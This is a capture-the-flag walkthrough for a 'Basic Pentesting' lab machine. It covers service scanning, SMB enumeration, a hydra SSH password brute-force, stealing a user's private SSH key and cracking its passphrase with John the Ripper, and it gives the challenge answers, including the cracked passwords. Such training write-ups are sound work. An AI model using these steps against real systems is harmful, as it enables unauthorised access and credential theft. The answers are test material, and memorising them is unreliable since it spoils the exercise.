# Basic Pentesting

### Find the services exposed by the machine

`nmap -sV -sC -A -oN initial.nmap <target-ip>`

Output: 
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What is the name of the hidden directory on the web server?

`gobuster dir -u http://<target-ip> -w <wordlist>`

> development

Output: `j.txt`
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Output: `dev.txt`
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

### User brute-forcing to find the username & password

`enum4linux -a <target-ip`

We see that there is an **Anonymous** share.

`smbclient //<target-ip>/Anonymous`

Output: `staff.txt`
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

### What is the username?

> jan

### What is the password?

`hydra -l jan -P <rockyou.txt> <target-ip> ssh -V`

> armando

### What service do you use to access the server?

> SSH

### Enumerate the machine to find any vectors for privilege escalation

Download `linpeas.sh` into `/tmp/<folder>` with a `python` webserver, make it executable, and run it.

Interesting output:
```
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
```

Copy the `id_rsa` file into our attack computer. Make sure to set the right permissions! 

`chmod 600 kay_id_rsa`.

### What is the name of the other user you found?

> kay

### If you have found another user, what can you do with this information?

`ssh -i kay_id_rsa kay@<target_ip>` to log in as kay. It seems that this is protected by a passphrase! We will need to use John the Ripper to crack it.

```
ssh2john kay_id_rsa > kay_hash.txt
john --wordlist=<rockyou.txt> kay_hash.txt
```
The passphrase is `beeswax`. Now we can login.

### What is the final password you obtain?

> heresareallystrongpasswordthatfollowsthepasswordpolicy$$